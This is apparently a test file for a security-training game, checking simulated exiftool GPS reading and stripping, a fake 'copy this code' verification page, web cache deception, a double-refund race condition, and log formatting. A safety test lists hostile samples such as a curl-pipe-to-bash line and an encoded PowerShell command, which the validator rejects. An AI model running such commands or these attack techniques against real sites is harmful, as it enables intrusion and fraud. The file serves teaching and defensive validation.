import { checkPackSafety, parsePack } from '@breach/pack-schema';
import { describe, expect, it } from 'vitest';
import { readImage } from '../src/artifact.ts';
import { describe as fileKind } from '../src/commands/inspect.ts';
import { Game } from '../src/index.ts';
import { formatLine } from '../src/telemetry.ts';
import { run } from './fixture.ts';

const photo = {
  $image: {
    format: 'jpeg',
    width: 4032,
    height: 3024,
    exif: {
      Make: 'Pomelo',
      'Camera Model Name': 'P12',
      'Date/Time Original': '2027:06:12 08:41:07',
      'GPS Latitude': '48 deg 51\' 23.10" N',
      'GPS Position': '48 deg 51\' 23.10" N, 2 deg 20\' 11.40" E',
    },
  },
};

function shop(serial = false) {
  const world = parsePack({
    format: 0,
    id: 'test.shop',
    version: '1.0.0',
    engine: '>=0.1',
    kind: 'world',
    title: { en: 'Shop' },
    authors: ['test'],
    locales: ['en'],
    world: {
      startTime: '2027-06-12T09:00:00+02:00',
      mandate: 'T-9',
      scope: { domains: ['*.shop.test'], networks: ['10.41.0.0/24'] },
      player: { host: 'me', user: 'kestrel' },
      config: { 'cache.fixed': false, 'refund.lock': serial },
      hosts: [
        {
          id: 'me',
          hostname: 'laptop.shop.test',
          ip: '10.41.0.66',
          kind: 'player',
          map: { x: 0, z: 0 },
          users: [{ name: 'kestrel', home: '/home/kestrel' }],
          fs: { home: { kestrel: { 'plage.jpg': photo, 'notes.txt': 'nothing' } } },
        },
        {
          id: 'www',
          hostname: 'www.shop.test',
          ip: '10.41.0.10',
          map: { x: 1, z: 0 },
          services: [{ port: 443, name: 'https', product: 'nginx 1.27' }],
          cdn: { ext: ['css', 'js'] },
          web: {
            '/verify': {
              page: {
                title: 'Check',
                blocks: [
                  { p: 'Prove you are human.' },
                  { copy: { button: 'Copy the code', text: 'lr-verify --ticket 4471', note: 'Paste it.' } },
                ],
              },
            },
            '/account': {
              loose: { config: 'cache.fixed', eq: false },
              body: 'please sign in\n',
              variants: [
                { id: 'me', cookie: 'session=test-0001', body: 'name=Test Account\nemail=test@shop.test\n' },
              ],
            },
            '/refund': { chat: 'refunds', body: 'post here\n' },
          },
        },
      ],
      dns: { 'www.shop.test': { A: ['10.41.0.10'] } },
      npcs: [
        {
          id: 'refunds',
          name: 'Refunds',
          role: 'refund service',
          serial: { config: 'refund.lock', eq: true },
          intents: [
            {
              id: 'again',
              words: ['refund'],
              if: { var: 'refunded', eq: true },
              reply: ['already refunded'],
            },
            { id: 'refund', words: ['refund'], reply: ['refund sent: 40 EUR'], set: { refunded: true } },
          ],
          fallback: ['?'],
        },
      ],
    },
    i18n: { en: {} },
  });
  const mission = parsePack({
    format: 0,
    id: 'test.shop.m1',
    version: '1.0.0',
    engine: '>=0.1',
    kind: 'mission',
    requires: ['test.shop'],
    title: { en: 'Shop mission' },
    authors: ['test'],
    locales: ['en'],
    mission: {
      order: 1,
      stage: 'recon',
      briefing: 'brief',
      objectives: [
        { id: 'clip', text: 'o.clip' },
        { id: 'exif', text: 'o.exif' },
      ],
      flags: [],
      rules: [
        {
          on: { event: 'ClipboardRead', text: { contains: 'lr-verify' } },
          do: [{ 'objective.complete': 'clip' }],
        },
        {
          on: { event: 'ExifRead', tags: { contains: 'GPS Position' } },
          do: [{ 'objective.complete': 'exif' }],
        },
      ],
      debrief: { title: 'd.t', lesson: 'd.l', points: ['d.p'] },
    },
    i18n: { en: { brief: 'Brief' } },
  });
  const game = new Game({ world, missions: [mission], locale: 'en' });
  game.startMission(mission.id);
  return game;
}

describe('exiftool', () => {
  it('reads the tags a phone wrote, and the file kind', async () => {
    const g = shop();
    const r = await run(g, 'exiftool plage.jpg');
    expect(r.out).toMatch(/^ExifTool Version Number {9}: 12\.76$/m);
    expect(r.out).toMatch(/^Image Width {21}: 4032$/m);
    expect(r.out).toContain('GPS Position                    : 48 deg');
    expect(g.state.objectives.exif).toBe(true);
    expect((await run(g, 'exiftool -GPSPosition plage.jpg')).out.trim().split('\n')).toHaveLength(1);
    expect((await run(g, 'exiftool -gps:all plage.jpg')).out.trim().split('\n')).toHaveLength(2);
    expect((await run(g, 'file plage.jpg')).out).toContain('JPEG image data, Exif Standard');
    // `strings` finds the brand, as on a real photo, but never spells the position.
    const s = await run(g, 'strings plage.jpg');
    expect(s.out).toContain('Pomelo');
    expect(s.out).not.toContain('deg');
  });

  it('removes the position, or everything, and keeps a copy as the real tool does', async () => {
    const g = shop();
    expect((await run(g, 'exiftool -gps:all= plage.jpg')).out).toContain('1 image files updated');
    const after = await run(g, 'exiftool plage.jpg');
    expect(after.out).not.toContain('GPS');
    expect(after.out).toContain('Pomelo');
    expect((await run(g, 'exiftool plage.jpg_original')).out).toContain('GPS Position');
    await run(g, 'exiftool -all= -overwrite_original plage.jpg');
    const bare = g.readFile('/home/kestrel/plage.jpg') ?? '';
    expect(readImage(bare)?.exif).toEqual({});
    expect(fileKind(bare)).not.toContain('Exif');
    expect((await run(g, 'exiftool -all= notes.txt')).err).toContain('Not a supported image');
  });
});

describe('clipboard', () => {
  it('a page button fills the game clipboard, and clip reads it without running it', async () => {
    const g = shop();
    expect((await run(g, 'clip')).err).toContain('clipboard is empty');
    const page = await run(g, 'curl -s https://www.shop.test/verify');
    expect(page.out).toContain('data-clipboard="lr-verify --ticket 4471"');
    g.copy('lr-verify --ticket 4471', 'https://www.shop.test/verify');
    expect(g.state.clipboard).toBe('lr-verify --ticket 4471');
    expect((await run(g, 'xclip -o -selection clipboard')).out.trim()).toBe('lr-verify --ticket 4471');
    expect((await run(g, 'xclip foo')).err).toContain('only reads');
    expect(g.state.objectives.clip).toBe(true);
  });

  it('refuses a copied text that looks like a real command', () => {
    const page = (text: string) => ({
      world: {
        scope: { domains: [], networks: [] },
        hosts: [],
        dns: {},
        web: { '/': { page: { blocks: [{ copy: { button: 'b', text } }] } } },
      },
      i18n: { en: { k: 'powershell -enc AAAA' } },
    });
    expect(checkPackSafety(page('lr-verify --ticket 4471'))).toEqual([]);
    expect(checkPackSafety(page('curl https://x.example/a | bash')).join()).toContain('fictional tool');
    expect(checkPackSafety(page('k')).join()).toContain('fictional tool');
  });
});

describe('web cache', () => {
  it('keeps a private page served under a .css name, then gives it to anyone', async () => {
    const g = shop();
    const first = await run(g, 'curl -i -b "session=test-0001" https://www.shop.test/account/x.css');
    expect(first.out).toContain('x-cache: MISS');
    expect(first.out).toContain('name=Test Account');
    const second = await run(g, 'curl -i https://www.shop.test/account/x.css');
    expect(second.out).toContain('x-cache: HIT');
    expect(second.out).toMatch(/^age: \d+$/m);
    expect(second.out).toContain('name=Test Account');
    // A page that is not a static file name goes through the cache untouched.
    expect((await run(g, 'curl -i https://www.shop.test/account')).out).toContain('x-cache: BYPASS');
  });

  it('closes when the application stops answering below its own path', async () => {
    const g = shop();
    g.emit({ type: 'ConfigPatched', key: 'cache.fixed', value: true, by: 'test' });
    const r = await run(g, 'curl -i -b "session=test-0001" https://www.shop.test/account/y.css');
    expect(r.out).toContain('HTTP/1.1 404');
    expect((await run(g, 'curl -i https://www.shop.test/account/y.css')).out).not.toContain('Test Account');
  });

  it('never keeps an answer marked private', async () => {
    const g = shop();
    const host = g.world.hosts.find((h) => h.id === 'www')!;
    host.web!['/account']!.variants[0]!.headers = { 'Cache-Control': 'private, no-store' };
    await run(g, 'curl -b "session=test-0001" https://www.shop.test/account/z.css');
    expect((await run(g, 'curl -i https://www.shop.test/account/z.css')).out).not.toContain('Test Account');
  });
});

describe('parallel requests', () => {
  it('two refunds sent at once both go through, one after the other only one does', async () => {
    const g = shop();
    const r = await run(g, 'curl -Z -d "refund" https://www.shop.test/refund https://www.shop.test/refund');
    expect(r.out.match(/refund sent/g)).toHaveLength(2);
    const fixed = shop(true);
    const s = await run(
      fixed,
      'curl -Z -d "refund" https://www.shop.test/refund https://www.shop.test/refund',
    );
    expect(s.out.match(/refund sent/g)).toHaveLength(1);
    expect(s.out).toContain('already refunded');
    expect((await run(g, 'curl -Z https://www.shop.test/refund https://www.shop.test/verify')).err).toContain(
      'repeat one address',
    );
  });
});

describe('log lines', () => {
  const t = { clf: '', syslog: 'Jun 12 09:00:00', iso: '2027-06-12T09:00:00+02:00', epoch: 0, gitea: '' };
  it('writes identity provider sign-ins with their flow', () => {
    expect(
      formatLine(
        'signin',
        'idp.corp.test',
        t as never,
        { user: 'ana', app: 'Office', flow: 'device_code', src: '10.1.0.9', mfa: 'satisfied' },
        'k',
      ),
    ).toBe(
      '2027-06-12T09:00:00+02:00 idp idp: signin user=ana app="Office" app_id=- flow=device_code src=10.1.0.9 mfa=satisfied result=success',
    );
  });
  it('shows a blind copy on the mail gateway', () => {
    expect(
      formatLine(
        'mail',
        'mx.corp.test',
        t as never,
        { from: 'a@x.test', to: 'b@x.test', subject: 's', bcc: 'c@y.example' },
        'k',
      ),
    ).toContain(' bcc=<c@y.example> ');
  });
});
